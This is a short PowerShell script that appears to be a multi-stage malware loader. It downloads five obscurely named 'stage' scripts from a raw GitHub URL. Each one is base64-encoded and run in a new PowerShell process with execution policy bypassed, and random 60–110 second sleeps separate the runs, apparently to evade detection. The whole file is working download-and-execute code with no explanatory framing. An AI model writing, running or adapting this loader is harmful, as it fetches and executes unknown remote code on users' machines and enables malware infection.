function DaEM {
    param(
        [string]$Url
    )
    $content = (New-Object System.Net.WebClient).DownloadString($Url)
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($content))
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoNewWindow -EncodedCommand $enc" 
}

$files = @(
    "gS1.ps1",
    "kS1.ps1",
    "kS2.ps1",
    "jS2.ps1",
    "jS3.ps1"
)

$base = "https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/"
foreach ($fil in $files){
    $full = $base + $fil
    DaEM $full
    Start-Sleep (Get-Random -min 60 -max 110)
}
